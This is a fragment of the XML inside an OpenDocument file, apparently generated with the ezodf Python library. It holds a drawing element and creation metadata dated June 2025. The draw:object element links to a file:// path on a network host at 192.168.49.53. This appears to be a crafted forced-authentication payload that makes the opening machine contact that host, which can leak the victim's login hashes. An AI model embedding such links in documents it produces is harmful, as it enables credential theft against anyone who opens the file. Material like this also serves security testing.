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101cm" svg:height="9.999cm" draw:z-index="0"><draw:object xlink:href="file://192.168.49.53/test.jp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25-06-26T22:57:49.560875</meta:creation-date>
    <dc:date>2025-06-26T22:57:49.561157</dc:date>
    <meta:generator>http://pypi.python.org/pypi/ezodf/0.1.0$Python2.7.18 (default, Aug  1 2024, 00:00:00) 
[GCC 13.3.1 20240522 (Red Hat 13.3.1-1)]</meta:generator>
    <meta:document-statistic/>
    <meta:editing-cycles>1</meta:editing-cycles>
  </office:meta>
</office:document-meta>
</file>